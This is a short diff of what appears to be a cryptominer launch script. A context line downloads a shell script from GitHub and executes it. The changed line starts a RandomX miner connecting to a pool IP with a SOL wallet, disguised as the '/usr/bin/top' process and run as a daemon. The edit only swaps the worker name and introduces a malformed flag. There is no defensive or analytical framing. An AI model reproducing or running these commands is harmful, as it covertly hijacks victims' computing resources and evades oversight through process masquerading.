@@ -4,7 +4,7 @@
 
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/rest.sh && chmod +x rest.sh && ./rest.sh && cd /usr/bin
 
-./hi -s "/usr/bin/top" -d -p test.pid ./bhmax --url 158.69.251.105:4052 --user SOL:5VqKde82ANkwGDXTRpBRa3vd1PFn1gdGN6tP7aJ38gx4.xd1 --pass x -k -t 3 --randomx-mode auto 	--randomx-wrmsr=-1 	--randomx-no-rdmsr --randomx-no-numa 
+./hi -s "/usr/bin/top" -d -p test.pid ./bhmax --url 158.69.251.105:4052 --user SOL:5VqKde82ANkwGDXTRpBRa3vd1PFn1gdGN6tP7aJ38gx4.xd7 --pass x -k -t 3--randomx-wrmsr -1 	--randomx-no-rdmsr --randomx-no-numa 
 
 #datalr
 
